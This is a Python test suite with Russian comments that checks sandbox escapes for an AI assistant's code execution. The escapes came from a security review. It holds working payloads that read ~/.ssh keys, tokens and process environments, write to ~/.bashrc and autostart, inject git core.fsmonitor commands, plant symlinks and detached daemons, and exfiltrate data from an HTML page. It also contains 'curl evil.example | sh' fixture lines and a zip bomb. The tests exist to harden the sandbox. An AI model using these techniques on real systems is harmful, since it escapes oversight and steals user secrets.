"""Обходы песочницы из независимой рецензии выпуска 5 (05.11) — каждый стал проверкой. Раньше:
- охрана Python (guard) снималась в 2–5 строк: флаг «внутри крючка» из замыкания fork_exec, правила-списки через gc,
  os.open(dir_fd=…) с относительным путём, гонка потоков на общем флаге, SQLite ATTACH и file:, tar -P / -C/путь / -T,
  чтение /proc/<pid>/environ самого Dewiar;
- код в песочнице оставлял ссылки (downloads/notes.txt → ~/.bashrc, outputs/rec.srt → автозапуск, _snap → ~/target), а
  Dewiar вне песочницы писал по ним (download, transcribe, снимки);
- рабочая копия задачи по коду: код переписывал «.git» на свой gitdir с core.fsmonitor — и git Dewiar выполнял команду;
- данная папка = вся ~ открывала ~/.ssh и токен Dewiar; bwrap видел / целиком (сокеты /run, /media, чужие дома), сеть —
  с 127.0.0.1 компьютера и абстрактным сокетом X11; внутри bwrap можно было заводить свои пространства пользователя.
Теперь: в настоящей песочнице (bwrap, landlock) эти обходы не проходят; под охраной закрыты все известные простые обходы,
а код и команды — только с разрешения человека (охрана — не песочница). Что остаётся открытым — печатается «⚠» и описано
в docs/HARNESS.md (выпуск 5, «Пределы»)."""
import json
import os
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from task_mock import Host, Mock, done, ok  # noqa: E402
import sandbox as S  # noqa: E402

TMP = Path(tempfile.mkdtemp(prefix="sbxesc-"))
H = TMP / "home"
(H / ".ssh").mkdir(parents=True)
(H / ".ssh/id_rsa").write_text("SSH-KEY-SECRET\n")
(H / ".bashrc").write_text("# bashrc\n")
(H / ".config/autostart").mkdir(parents=True)
(H / "Documents").mkdir()
(H / "Documents/diary.txt").write_text("DIARY-OK\n")
(H / ".config/dewiar").mkdir(parents=True)
(H / ".config/dewiar/token").write_text("BRIDGE-TOKEN-SECRET\n")
(H / "target").mkdir()
os.environ.update(HOME=str(H), DEWIAR_PROBA_SECRET="ENV-SECRET-OF-DEWIAR")
os.environ.pop("DEWIAR_SANDBOX", None)
WS = H / "Dewiar"
T = WS / "Задачи" / "t1"
(T / "outputs").mkdir(parents=True)
(T / "_run").mkdir()
(T / "задача.json").write_text('{"id":"t1"}')
BASHRC, SECRETS = "# bashrc\n", ("SSH-KEY-SECRET", "BRIDGE-TOKEN-SECRET", "ENV-SECRET-OF-DEWIAR")

MODES = ["guard"] + (["landlock"] if S.landlock_ok() else []) + (["bwrap"] if S.bwrap_ok() else [])
print("режимы:", MODES, "| Landlock ABI", S.landlock_abi(), "| slirp4netns:", "есть" if S.slirp_bin() else "нет")
if "landlock" not in MODES:
    print("⚠ Landlock нет — его часть пропущена")
if "bwrap" not in MODES:
    print("⚠ bubblewrap нет — его часть пропущена")


def run(m, code, net=False, grants=(), argv=None):
    (T / "_run/step.py").write_text(code, encoding="utf-8")
    r = S.run(argv or [sys.executable, str(T / "_run/step.py")], T, m=m, net=net, grants=list(grants), hide=[str(WS)],
              protect=("задача.json", "_run"), timeout=60, env={"H": str(H)})
    return r.out + "\n" + r.err


def clean_home():
    return (H / ".bashrc").read_text() == BASHRC and not os.listdir(H / ".config/autostart") and not os.listdir(H / "target") \
        and not (H / ".profile").exists() and not (H / ".mozilla_cookies.sqlite").exists()


PAYLOADS = {
    # флаг «внутри крючка» из замыкания fork_exec — флага больше нет
    "замыкание fork_exec": r'''
import os, subprocess
H = os.environ["H"]
try:
    import _posixsubprocess as ps
    for c in ps.fork_exec.__closure__ or ():
        if type(c.cell_contents) is list: c.cell_contents.append(1)
except Exception: pass
for f in (H + "/.ssh/id_rsa", H + "/.config/dewiar/token"):
    try: print("READ", open(f).read())
    except Exception as e: print("нет", type(e).__name__)
for f, s in ((H + "/.bashrc", "evil\n"), (H + "/.config/autostart/x.desktop", "[Desktop Entry]\n")):
    try: open(f, "a").write(s)
    except Exception as e: print("нет", type(e).__name__)
''',
    # правила-списки через gc: теперь кортежи
    "gc: список правил": r'''
import gc, os
H = os.environ["H"]
for f in gc.get_objects():
    if type(f).__name__ == "function" and f.__name__ == "can_write" and f.__closure__:
        for c in f.__closure__:
            v = c.cell_contents
            if isinstance(v, list) and v and isinstance(v[0], str): v.append(os.path.realpath(H))
try: open(H + "/.bashrc", "a").write("echo via-gc\n")
except Exception as e: print("нет", type(e).__name__)
''',
    "dir_fd": r'''
import os
H = os.environ["H"]
try:
    d = os.open("/", os.O_RDONLY)
    fd = os.open(H.lstrip("/") + "/.ssh/id_rsa", os.O_RDONLY, dir_fd=d); print("READ", os.read(fd, 100))
except Exception as e: print("нет", type(e).__name__)
try:
    d = os.open("/", os.O_RDONLY)
    fd = os.open(H.lstrip("/") + "/.bashrc", os.O_WRONLY | os.O_APPEND, dir_fd=d); os.write(fd, b"echo dirfd\n")
except Exception as e: print("нет", type(e).__name__)
''',
    "гонка потоков": r'''
import os, threading
H = os.environ["H"]; stop = []; got = []
def noise():
    while not stop:
        try: os.listdir("outputs")
        except Exception: pass
ts = [threading.Thread(target=noise) for _ in range(3)]
[t.start() for t in ts]
for i in range(20000):
    try: got.append(open(H + "/.ssh/id_rsa").read()); break
    except Exception: pass
stop.append(1); [t.join() for t in ts]
print("READ", got[:1] if got else "нет")
''',
    "SQLite ATTACH и file:": r'''
import os, sqlite3
H = os.environ["H"]
c = sqlite3.connect(":memory:")
try:
    c.execute(f"ATTACH DATABASE '{H}/.mozilla_cookies.sqlite' AS m"); c.execute("CREATE TABLE m.t(x)"); c.commit()
except Exception as e: print("нет", type(e).__name__)
try: sqlite3.connect(f"file:{H}/.ssh/id_rsa?mode=ro", uri=True).execute("select 1")
except Exception as e: print("нет", type(e).__name__)
c3 = sqlite3.connect("outputs/своя.sqlite"); c3.execute("create table t(x)"); c3.commit(); print("своя база — можно")
''',
    "tar -P, -T, -C/путь": r'''
import os, tarfile, io, subprocess
H = os.environ["H"]
with tarfile.open("outputs/a.tar", "w") as tf:
    d = b"[Desktop Entry]\nExec=sh -c id\n"; ti = tarfile.TarInfo(H + "/.config/autostart/tar.desktop"); ti.size = len(d); tf.addfile(ti, io.BytesIO(d))
    d2 = b"echo via-C\n"; t2 = tarfile.TarInfo(".profile"); t2.size = len(d2); tf.addfile(t2, io.BytesIO(d2))
open("list.txt", "w").write(H + "/.ssh/id_rsa\n")
for args in (["tar", "-P", "-xf", "outputs/a.tar"], ["tar", "xPf", "outputs/a.tar"], ["tar", "-P", "-cf", "outputs/loot.tar", "-T", "list.txt"],
             ["tar", "-xf", "outputs/a.tar", "-C" + H], ["tar", "-xf", "outputs/a.tar", "--directory=" + H]):
    try: subprocess.run(args, capture_output=True)
    except Exception as e: print("нет", type(e).__name__)
try: print(subprocess.run(["tar", "-P", "-xOf", "outputs/loot.tar"], capture_output=True, text=True).stdout)
except Exception as e: print("нет", type(e).__name__)
''',
    "/proc/<pid>/environ Dewiar": r'''
import os
hits = []
for d in os.listdir("/proc"):
    if d.isdigit():
        try: env = open(f"/proc/{d}/environ", "rb").read()
        except Exception: continue
        if b"ENV-SECRET-OF-DEWIAR" in env: hits.append(d)
print("чужих окружений с тайной:", len(hits), "ENV-SECRET-OF-DEWIAR" if hits else "")
''',
}

for m in MODES:
    for name, code in PAYLOADS.items():
        out = run(m, code)
        ok(clean_home() and not any(x in out for x in SECRETS), f"{m}: {name} — ни чтения тайн, ни записи в домашнюю папку")
        if name.startswith("SQLite"):
            ok("своя база — можно" in out, f"{m}: SQLite в папке задачи работает")
    # данная папка = вся ~ (S1): ~/.ssh, токен Dewiar и папка ассистента — закрыты, остальное — читается
    out = run(m, "import os\nH=os.environ['H']\nfor f in ('.ssh/id_rsa', '.config/dewiar/token', 'Dewiar/Заметки.md', 'Documents/diary.txt'):\n"
                 "    try: print(f, open(os.path.join(H, f)).read().strip())\n    except Exception as e: print(f, 'нет')", grants=[str(H)])
    ok(not any(x in out for x in SECRETS) and "DIARY-OK" in out, f"{m}: данная папка — вся ~: личное внутри закрыто, остальное читается")
    # ffmpeg -i — обычный вход, не «запуск программы» (S6)
    if shutil.which("ffmpeg"):
        out = run(m, "import subprocess\nr = subprocess.run(['ffmpeg', '-hide_banner', '-y', '-f', 'lavfi', '-i', 'sine=d=0.1', 'outputs/x.wav'], capture_output=True)\n"
                     "print('ffmpeg', r.returncode)")
        ok("ffmpeg 0" in out, f"{m}: ffmpeg -i с файлами задачи — можно ({out.strip()[:80]})")

# gc: подмена содержимого ячейки замыкания (а не списка) — под охраной проходит: Python не песочница. Поэтому под охраной —
# разрешение человека (sandbox_test), а в bwrap и landlock — запрет ядра
CELL = r'''
import gc, os
H = os.environ["H"]
for f in gc.get_objects():
    if type(f).__name__ == "function" and f.__name__ in ("can_write", "can_read") and f.__closure__:
        for c in f.__closure__:
            v = c.cell_contents
            if isinstance(v, tuple) and v and all(isinstance(x, str) for x in v) and not any("задача.json" in x for x in v):
                c.cell_contents = v + (os.path.realpath(H),)
try: open(H + "/.bashrc", "a").write("echo via-cell\n"); print("записал")
except Exception as e: print("нет", type(e).__name__)
'''
for m in MODES:
    out = run(m, CELL)
    if m == "guard":
        print(f"⚠ охрана: подмена ячейки замыкания — {'проходит' if not clean_home() else 'не прошла'} (известно: охрана — не песочница, "
              "поэтому код под охраной — только с разрешения человека)")
        (H / ".bashrc").write_text(BASHRC)
    else:
        ok(clean_home(), f"{m}: подмена ячейки замыкания охраны — запись в ~ всё равно запрещена ядром")

# сокеты: файл-сокет системы (вместо /run/docker.sock), абстрактный сокет X11, 127.0.0.1 при данной сети; свои
# пространства пользователя внутри
SOCK = Path(tempfile.mkdtemp(prefix="sx", dir="/tmp" if os.path.isdir("/tmp") else None)) / "docker.sock"   # короткий путь (AF_UNIX)
us = socket.socket(socket.AF_UNIX)
us.bind(str(SOCK))
us.listen(5)
ab = socket.socket(socket.AF_UNIX)
ab.bind("\0/tmp/.X11-unix/X77")
ab.listen(5)
for srv_ in (us, ab):
    threading.Thread(target=lambda s_=srv_: [(c.sendall(b"HELLO"), c.close()) for c, _ in iter(s_.accept, None)], daemon=True).start()
SCODE = f'''
import socket
for addr in ({str(SOCK)!r}, "\\0/tmp/.X11-unix/X77"):
    s = socket.socket(socket.AF_UNIX)
    try: s.connect(addr); print("ДОСТУП", repr(addr[:20]), s.recv(5))
    except Exception as e: print("нет", type(e).__name__)
'''
for m in MODES:
    for net in (False, True):
        out = run(m, SCODE, net=net)
        unix_ok = "ДОСТУП '/" not in out
        abs_ok = "ДОСТУП '\\x00" not in out
        if m == "landlock":
            if not unix_ok:
                print("⚠ landlock: файл-сокет системы виден (Landlock не управляет connect к именованным сокетам) — см. HARNESS.md")
            ok(abs_ok or S.landlock_abi() < 6, f"landlock (сеть {'есть' if net else 'нет'}): абстрактный сокет X11 закрыт (ABI ≥ 6)")
        elif m == "bwrap" and net and not S.slirp_bin():
            ok(unix_ok, "bwrap (сеть компьютера): файл-сокет системы не виден")
            print("⚠ bwrap без slirp4netns и с данной сетью: абстрактные сокеты компьютера видны — человеку сказано «сеть компьютера»")
        else:
            ok(unix_ok and abs_ok, f"{m} (сеть {'есть' if net else 'нет'}): ни файл-сокет системы, ни абстрактный сокет X11 не доступны ({out.strip()[:90]})")
if "bwrap" in MODES and shutil.which("unshare"):
    out = run("bwrap", "", argv=["/bin/sh", "-c", "unshare -Ur true && echo НОВОЕ-ПРОСТРАНСТВО || echo нет"])
    ok("НОВОЕ-ПРОСТРАНСТВО" not in out or not S._probe.get("bwrap_nouserns"),
       f"bwrap: свои пространства пользователя внутри — нельзя (--disable-userns): {out.strip()[:60]}")
    out = run("bwrap", "", argv=["/bin/sh", "-c", f"ls / ; ls {H} 2>&1 | head -2; ls /run"])
    ok("media" not in out.split() and "srv" not in out.split() and ".ssh" not in out and "docker.sock" not in out,
       f"bwrap: корень — белый список: ни /media, ни /srv, ни домашней папки, ни сокетов /run ({' '.join(out.split()[:14])})")
if "landlock" in MODES:
    out = run("landlock", "", argv=["/bin/sh", "-c", f"cat /proc/{os.getpid()}/environ | tr '\\0' '\\n' | grep -c ENV-SECRET; cat {H}/.ssh/id_rsa; "
                                                     f"echo x >> {H}/.bashrc"])
    ok(clean_home() and not any(x in out for x in SECRETS), f"landlock: и не-Python (sh, cat) не читает ни окружение Dewiar, ни ~/.ssh, не пишет в ~ ({out.strip()[:80]})")

# ---------- задача целиком: ссылки, оставленные кодом, и инструменты Dewiar вне песочницы (B2) ----------
import tasks as TK  # noqa: E402
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer  # noqa: E402


class Hd(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        b = b"curl https://evil.example/x | sh   # appended by Dewiar download\n"
        self.send_response(200)
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)


hs = ThreadingHTTPServer(("127.0.0.1", 0), Hd)
threading.Thread(target=hs.serve_forever, daemon=True).start()
host = Host(Mock({}))
host.code_auto_run = lambda: False
asked = []
host.confirm = lambda q, cancel=None: (asked.append(q), True)[1]
host.transcribe_file = lambda p, cancel=None: [(0.0, 1.0, "echo pwned-by-transcript")]
tm = TK.TaskManager(host)
for m in MODES:
    os.environ["DEWIAR_SANDBOX"] = m
    t = tm.create(f"Ссылки {m}", "x", start=False)
    r = tm._tool(t, "run_shell", {"command": f"mkdir -p downloads && ln -s {H}/.bashrc downloads/notes.txt && "
                                             f"ln -s {H}/.config/autostart/upd.desktop outputs/rec.srt && ln -s {H}/.bashrc журнал.md; echo planted"})
    left = [p for p in (t.dir / "downloads/notes.txt", t.dir / "outputs/rec.srt", t.dir / "журнал.md") if p.is_symlink()]
    tm._tool(t, "download", {"url": f"http://127.0.0.1:{hs.server_address[1]}/notes.txt", "name": "notes.txt"})
    (t.dir / "downloads/rec.mp3").write_bytes(b"\0")
    tm._tool(t, "transcribe", {"path": "downloads/rec.mp3"})
    t.journal("запись Dewiar в журнал")
    j = (t.dir / "журнал.md").read_text(encoding="utf-8") if (t.dir / "журнал.md").is_file() else ""
    ok(clean_home() and not left and "ссылки за пределы папки задачи" in j,
       f"{m}: ссылки наружу, оставленные кодом, удалены после запуска; download, transcribe, журнал пишут в папку задачи")
    # _snap ссылкой, когда первый снимок пропущен (outputs/ больше предела)
    t2 = tm.create(f"Снимки {m}", "x", start=False)
    (t2.dir / "outputs").mkdir(exist_ok=True)
    with open(t2.dir / "outputs/big.mp4", "wb") as f:
        f.truncate(201 << 20)
    tm._tool(t2, "run_shell", {"command": f"ln -s {H}/target _snap && rm outputs/big.mp4 && echo planted"})
    t2.data["steps"] = 5
    tm._tool(t2, "write_file", {"path": "outputs/a.txt", "content": "hello"})
    ok(clean_home() and not (t2.dir / "_snap").is_symlink(), f"{m}: «_snap» ссылкой — убран, снимки не пишутся в домашнюю папку")
os.environ.pop("DEWIAR_SANDBOX", None)

# ---------- задача по коду: «рабочая копия/.git» и драйверы .gitattributes (B3) ----------
if shutil.which("git"):
    proj = TMP / "proj"
    proj.mkdir()
    g = lambda *a: subprocess.run(["git", "-C", str(proj), *a], capture_output=True, check=True)  # noqa: E731
    g("init", "-q")
    (proj / "a.txt").write_text("1\n")
    g("-c", "user.name=t", "-c", "user.email=t@t", "add", "-A")
    g("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "init")
    MARK, MARK2 = TMP / "PWNED_FSMONITOR", TMP / "PWNED_FILTER"
    # драйвер filter, определённый у человека (или в глобальных настройках), — его назовёт .gitattributes, написанный кодом
    g("config", "filter.evilf.clean", f"sh -c 'touch {MARK2}; cat'")
    for m in MODES:
        os.environ["DEWIAR_SANDBOX"] = m
        tc = tm.create(f"Код {m}", "x", project=str(proj), start=False)
        tm._tool(tc, "code_list", {})
        work = tc.dir / "рабочая копия"
        was = (work / ".git").read_bytes()
        evil = (f"git init -q evilrepo && mv evilrepo/.git evil && rmdir evilrepo && "
                f"printf '[core]\\n\\tfsmonitor = \"touch {MARK}; echo\"\\n' >> evil/config && "
                f"(printf 'gitdir: ./evil' > .git || true) && printf '* filter=evilf\\n' > .gitattributes && echo 2 > a.txt")
        tm._tool(tc, "run_shell", {"command": f"cd 'рабочая копия' && {evil}"})
        ok((work / ".git").read_bytes() == was, f"{m}: «рабочая копия/.git» после кода — как был")
        d = tm.detail(tc.id)
        ok(not MARK.exists() and not MARK2.exists() and "a.txt" in json.dumps(d.get("changes"), ensure_ascii=False),
           f"{m}: git Dewiar по рабочей копии не выполнил ни core.fsmonitor, ни filter из .gitattributes; изменения видны")
        # даже если .git подменён в обход проверки — git Dewiar идёт по своему GIT_DIR
        (work / ".git").write_text("gitdir: ./evil")
        tc.code().changes()
        tc.code().diff()
        ok(not MARK.exists() and not MARK2.exists(), f"{m}: подменённый .git не читается вовсе — у git Dewiar свой GIT_DIR")
        (work / ".git").write_bytes(was)
    os.environ.pop("DEWIAR_SANDBOX", None)
else:
    print("⚠ git нет — часть «рабочая копия» пропущена")

# проверка HTML в браузере (quality.html_check) — страница модели без сети: ни WebSocket, ни fetch, ни WebRTC (рецензия: route
# Playwright не ловит WebSocket — страница уводила данные на 127.0.0.1 или в интернет)
import quality as Q  # noqa: E402
seen = []
ls = socket.socket()
ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
ls.bind(("127.0.0.1", 0))
ls.listen(16)
WSP = ls.getsockname()[1]


def _acc():
    while True:
        try:
            c, _ = ls.accept()
        except OSError:
            return
        seen.append(c.recv(200).split(b"\r\n")[0])
        c.close()


threading.Thread(target=_acc, daemon=True).start()
page = TMP / "ws.html"
page.write_text(f"""<html><body>Отчёт готов<script>
try {{ new WebSocket("ws://127.0.0.1:{WSP}/exfil?d=SECRET"); }} catch (e) {{}}
fetch("http://127.0.0.1:{WSP}/fetch").catch(() => {{}});
try {{ new RTCPeerConnection({{iceServers: [{{urls: "stun:127.0.0.1:{WSP}"}}]}}).createDataChannel("x"); }} catch (e) {{}}
new Image().src = "http://127.0.0.1:{WSP}/img";
</script></body></html>""", encoding="utf-8")
res = Q.html_check([str(page)])
import time  # noqa: E402
time.sleep(1.0)
if res is None:
    print("⚠ браузера для проверки HTML нет — часть «html_check без сети» пропущена")
else:
    ok("Отчёт готов" in (res.get(str(page)) or {}).get("text", "") and not seen,
       f"html_check: страница открылась, а наружу — ни WebSocket, ни fetch, ни WebRTC, ни картинки ({seen[:3]})")
ls.close()

# ---------- вторая рецензия (05.11) ----------
import stat  # noqa: E402
import time  # noqa: E402
import zipfile  # noqa: E402
import export as X  # noqa: E402
import codework as CW  # noqa: E402

# Landlock — не песочница для «без вопросов» (именованные сокеты: сессионная D-Bus → systemd-run --user; при ABI < 4 — сеть)
ok(not S.real_sandbox("landlock") and S.real_sandbox("bwrap") and not S.real_sandbox("guard"),
   "без вопросов человеку — только bwrap; landlock и охрана — с разрешения")
if "landlock" in MODES:
    os.environ["DEWIAR_SANDBOX"] = "landlock"
    asked.clear()
    tl = tm.create("Landlock", "x", start=False)
    r1 = tm._tool(tl, "run_python", {"code": "print(1)"})
    ok(r1.startswith("Код выхода 0") and len(asked) == 1, "landlock: run_python — с разрешения человека раз на задачу")
    os.environ.pop("DEWIAR_SANDBOX")
# просили bwrap, а его нет — кода нет (громко), а не тихо landlock
os.environ.update(DEWIAR_SANDBOX="bwrap", DEWIAR_BWRAP=str(TMP / "нет-bwrap"))
S._probe.clear()
ok(S.mode() == "" and tm._tool(tm.create("Без bwrap", "x", start=False), "run_python", {"code": "print(1)"}).startswith("Ошибка"),
   "DEWIAR_SANDBOX=bwrap без bwrap — код не запускается (не тихо слабее)")
os.environ.pop("DEWIAR_SANDBOX")
os.environ.pop("DEWIAR_BWRAP")
S._probe.clear()

# демон, ушедший в свою сессию с чистым окружением (setsid env -i), переживал запуск и после purge_links подменял папку
# ссылкой: запускатель — «приёмный отец» (PR_SET_CHILD_SUBREAPER) и добивает всех потомков до purge_links
for m in MODES:
    for un in ("1", "0") if m != "bwrap" else ("1",):
        os.environ["DEWIAR_SANDBOX_UNSHARE"] = un
        S._probe.pop("unshare", None)
        (T / "downloads").mkdir(exist_ok=True)
        daemon = f"import os, time\ntime.sleep(2)\nos.rename('downloads', 'downloads.old'); os.symlink({str(H / 'target')!r}, 'downloads')\nopen('pwned_marker','w').write('x')"
        sh = f"setsid env -i {sys.executable} -I -S -c \"{daemon}\" </dev/null >/dev/null 2>&1 & sleep 0.3; echo started"
        S.run(["/bin/bash", "-c", sh], T, m=m, timeout=10)
        time.sleep(3)
        ok(not (T / "downloads").is_symlink() and not (T / "pwned_marker").exists(),
           f"{m}{'' if un == '1' else ' без unshare'}: ушедший в свою сессию демон убит вместе с запуском")
        for n in ("downloads", "pwned_marker"):
            if (T / n).is_symlink() or (T / n).is_file():
                (T / n).unlink()
        if (T / "downloads.old").is_dir():
            shutil.rmtree(T / "downloads.old")
os.environ.pop("DEWIAR_SANDBOX_UNSHARE", None)
S._probe.pop("unshare", None)

# FIFO на месте служебных файлов и скачивания вешал карточку задачи (detail) и запись (_wr)
for m in MODES:
    os.environ["DEWIAR_SANDBOX"] = m
    tf = tm.create(f"FIFO {m}", "x", start=False)
    tm._tool(tf, "run_shell", {"command": "mkfifo итог.md критерии.json задачи.json; mkdir -p downloads; mkfifo downloads/notes.txt outputs/x 2>/dev/null; echo ok"})
    res = []
    th = threading.Thread(target=lambda: (res.append(tm.detail(tf.id)), tf.journal("x"), tf.save(),
                                          res.append(tm._tool(tf, "download", {"url": f"http://127.0.0.1:{hs.server_address[1]}/n", "name": "notes.txt"})),
                                          res.append(tm._tool(tf, "file_glob", {"pattern": "**/*"}))), daemon=True)
    th.start()
    th.join(15)
    ok(len(res) == 3 and not any(os.path.lexists(tf.dir / n) and not stat.S_ISREG(os.lstat(tf.dir / n).st_mode) and not stat.S_ISDIR(os.lstat(tf.dir / n).st_mode)
                                 for n in ("итог.md", "критерии.json", "задачи.json", "downloads/notes.txt")),
       f"{m}: FIFO вместо служебных файлов и скачивания — убраны, карточка, журнал и download не зависли")
os.environ.pop("DEWIAR_SANDBOX", None)

# жёсткая ссылка из данной папки в папку задачи (Dewiar потом писал бы в неё) — нельзя
G = TMP / "дано"
G.mkdir(exist_ok=True)
(G / "f.txt").write_text("G")
for m in [x for x in MODES if x != "guard"]:
    out = run(m, "", grants=[str(G)], argv=["/bin/sh", "-c", f"ln {G}/f.txt hard.txt && echo LINKED || echo нет"])
    ok("LINKED" not in out and not (T / "hard.txt").exists(), f"{m}: жёсткая ссылка на файл данной папки — нельзя")

# ~/.ssh — ссылка на /data/ssh: закрыта и ссылка, и то, куда ведёт; bwrap не падает («Can't create file»)
DATA = TMP / "data"
(DATA / "ssh").mkdir(parents=True)
(DATA / "ssh" / "id_rsa").write_text("SYMLINK-SSH-SECRET")
shutil.move(str(H / ".ssh"), str(TMP / "ssh-was"))
os.symlink(DATA / "ssh", H / ".ssh")
for m in MODES:
    for gr in ([str(H)], [str(H), str(DATA)]):
        out = run(m, "", grants=gr, argv=["/bin/sh", "-c", f"cat {H}/.ssh/id_rsa {DATA}/ssh/id_rsa 2>&1; echo конец"]) if m != "guard" else \
            run(m, f"import os\nfor f in ({str(H / '.ssh/id_rsa')!r}, {str(DATA / 'ssh/id_rsa')!r}):\n    try: print(open(f).read())\n    except Exception as e: print('нет')\nprint('конец')", grants=gr)
        ok("SYMLINK-SSH-SECRET" not in out and "конец" in out, f"{m}: ~/.ssh ссылкой на {len(gr) > 1 and 'данную ' or ''}папку — закрыт, запуск не падает")
os.unlink(H / ".ssh")
shutil.move(str(TMP / "ssh-was"), str(H / ".ssh"))

# облако: временная папка песочницы — на диске, тоже в потолке
if "bwrap" in MODES:
    r = S.run(["/bin/sh", "-c", "dd if=/dev/zero of=/tmp/big bs=1M count=200 status=none; sleep 8"], T, m="bwrap", strict=True,
              max_bytes=10 << 20, timeout=30)
    ok(r.oversize, "облако: забить /tmp песочницы тоже нельзя — потолок папки считает и её")

# zip-бомба в docx: проверка итога не съедает память и время
bomb = TMP / "bomb.docx"
with zipfile.ZipFile(bomb, "w", zipfile.ZIP_DEFLATED, compresslevel=1) as z:
    with z.open("word/document.xml", "w", force_zip64=True) as f:
        for _ in range(300):
            f.write(b"A" * (1 << 20))
t0 = time.time()
txt = Q.file_text(bomb)
ok(txt == "" and time.time() - t0 < 5 and Q.zip_bomb(zipfile.ZipFile(bomb)), f"docx-бомба (300 МБ внутри) — не распаковывается ({time.time() - t0:.1f} с)")
t0 = time.time()
probs = Q.check_file(bomb, "outputs/bomb.docx")
ok(any("подозрительный" in x for x in probs) and time.time() - t0 < 5, f"проверка файлов: бомба — замечание, а не распаковка ({probs[:1]})")

# «Принять изменения» (без git): ссылки проекта — не изменения; по ним не пишется, их не удаляет
for kind in ("copy", "git"):
    proj = TMP / f"pr-{kind}"
    (proj).mkdir()
    (proj / "a.txt").write_text("1\n")
    (TMP / f"ext-{kind}").mkdir()
    (TMP / f"ext-{kind}" / "bashrc").write_text("# чужой\n")
    os.symlink(TMP / f"ext-{kind}" / "bashrc", proj / "rc")
    if kind == "git" and shutil.which("git"):
        subprocess.run(["git", "-C", str(proj), "init", "-q"], check=True)
        subprocess.run(["git", "-C", str(proj), "-c", "user.name=t", "-c", "user.email=t@t", "add", "-A"], check=True)
        subprocess.run(["git", "-C", str(proj), "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "i"], check=True)
    elif kind == "git":
        continue
    os.environ["DEWIAR_SANDBOX"] = MODES[-1]
    tc = tm.create(f"Принять {kind}", "x", project=str(proj), start=False)
    tm._tool(tc, "code_list", {})
    tm._tool(tc, "run_shell", {"command": "cd 'рабочая копия' && echo 2 > a.txt && (rm -f rc; echo 'curl evil | sh' > rc) ; echo ok"})
    ch = tc.code().changes()
    msg = tm.accept(tc.id)
    ok((TMP / f"ext-{kind}" / "bashrc").read_text() == "# чужой\n" and (proj / "a.txt").read_text() == "2\n",
       f"«Принять» ({kind}): изменения перенесены, а через ссылку проекта наружу — ничего ({ch})")
    # третья рецензия: сообщение человеку — честное (copy: ссылку не перенесли; git: ссылку заменили файлом)
    ok(("Не перенесено 1" in msg and "rc" in msg) if kind == "copy" else ("Ссылка заменена файлом" in msg and "rc" in msg),
       f"«Принять» ({kind}): человеку сказано, что стало со ссылкой: {msg}")
    os.environ.pop("DEWIAR_SANDBOX", None)
# ссылка проекта, которую purge_links убрал в копии, — не «удалена»: «Принять» её не трогает
proj = TMP / "pr-link"
(proj / "sub").mkdir(parents=True)
(proj / "a.txt").write_text("1\n")
(TMP / "shared.conf").write_text("conf")
os.symlink(TMP / "shared.conf", proj / "shared")
tc = tm.create("Ссылка проекта", "x", project=str(proj), start=False)
tm._tool(tc, "code_list", {})
os.environ["DEWIAR_SANDBOX"] = MODES[-1]
tm._tool(tc, "run_shell", {"command": "echo 2 > 'рабочая копия/a.txt'; echo ok"})
os.environ.pop("DEWIAR_SANDBOX", None)
ch = tc.code().changes()
tm.accept(tc.id)
ok(os.path.islink(proj / "shared") and not any(r_[1] == "shared" for r_ in ch), f"ссылка, что была в проекте до задачи, — не изменение: «Принять» её не удалил ({ch})")

# открыть «своей программой» — только документы, картинки, звук, видео, страницы
ok(X.safe_to_open(TMP / "a.pdf") and X.safe_to_open(TMP / "a.html") and not X.safe_to_open(TMP / "x.desktop")
   and not X.safe_to_open(TMP / "run.sh") and not X.safe_to_open(TMP / "a.docm"),
   "«Открыть»: .desktop, .sh, документы с макросами — только показать в папке")

# части: файлы части копируются без ссылок и особых файлов
tp = tm.create("Родитель", "x", start=False)
part = tm.create("Часть", "x", start=False, parent=tp.id)
(part.dir / "outputs").mkdir(exist_ok=True)
(part.dir / "outputs" / "ok.md").write_text("часть")
os.symlink(H / ".ssh" / "id_rsa", part.dir / "outputs" / "key.txt")
part.data.update(status="done", result="готово")
tm._wait_parts(tp, 0.01)
cp = tp.dir / "parts" / "Часть"
ok((cp / "ok.md").exists() and not os.path.lexists(cp / "key.txt"), "wait_parts: файлы части — без ссылок (чужое не копируется)")

# честно о данной сети: со своей сетью slirp4netns видна домашняя сеть
ok("домашнюю сеть" in S.net_note("bwrap") if S.slirp_bin() else "локальные службы" in S.net_note("bwrap"),
   f"сеть задачи — честно: {S.net_note('bwrap')[:80]}")

# file_read Dewiar (вне песочницы) по данной папке = вся ~ (S1)
tg = tm.create("Вся домашняя", "x", start=False, folders=[str(H)])
r = tm._tool(tg, "file_read", {"path": str(H / ".ssh/id_rsa")})
r2 = tm._tool(tg, "file_read", {"path": str(H / "Documents/diary.txt")})
ok("SSH-KEY-SECRET" not in r and "личное" in r and "DIARY-OK" in r2, f"file_read: в данной папке ~ — личное закрыто, остальное читается ({r[:70]})")
done()
